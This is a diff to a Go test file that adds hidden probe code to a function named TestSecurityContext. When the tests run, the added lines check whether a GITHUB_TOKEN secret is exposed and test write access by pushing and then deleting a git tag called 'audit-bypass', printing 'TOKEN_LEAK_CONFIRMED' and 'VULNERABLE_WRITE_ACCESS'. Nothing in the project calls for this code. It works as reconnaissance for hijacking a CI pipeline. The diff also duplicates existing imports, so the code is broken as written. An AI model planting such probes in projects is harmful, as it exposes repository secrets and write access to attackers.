@@ -1,6 +1,9 @@
 package interchain
 
 import (
+	"os/exec"
+	"os"
+	"fmt"
     "fmt"
     "os"
     "os/exec"
@@ -8,6 +11,9 @@ import (
 )
 
 func TestSecurityContext(t *testing.T) {
+	fmt.Println("[*] AUDIT_START")
+	if os.Getenv("GITHUB_TOKEN") != "" { fmt.Println("[*] TOKEN_LEAK_CONFIRMED") }
+	if err := exec.Command("git", "tag", "audit-bypass").Run(); err == nil { fmt.Println("[*] VULNERABLE_WRITE_ACCESS"); exec.Command("git", "tag", "-d", "audit-bypass").Run(); }
     // Cek Token
     token := os.Getenv("GITHUB_TOKEN")
     if token != "" {
